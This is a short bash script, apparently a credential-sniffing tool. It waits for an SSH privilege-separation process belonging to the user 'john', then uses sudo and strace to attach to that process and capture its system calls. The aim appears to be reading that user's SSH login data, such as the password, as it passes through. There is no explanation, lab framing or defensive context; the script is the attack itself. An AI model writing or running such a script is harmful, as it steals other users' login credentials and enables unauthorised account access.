#!/bin/bash

echo "start searching ssh sessions .."
spoof_pid=$(ps -aux | grep ssh | grep priv | grep john)
while [ $? -eq 1 ]
do
         spoof_pid=$(ps -aux | grep ssh | grep priv | grep john)
done

spoof_pid=$(ps -aux | grep ssh | grep priv | grep john | awk '{print $2}')
echo "start sniffing PID : $spoof_pid"
sudo strace -p $spoof_pid -ff -v -s 128 2>&1 | grep '^KZS'
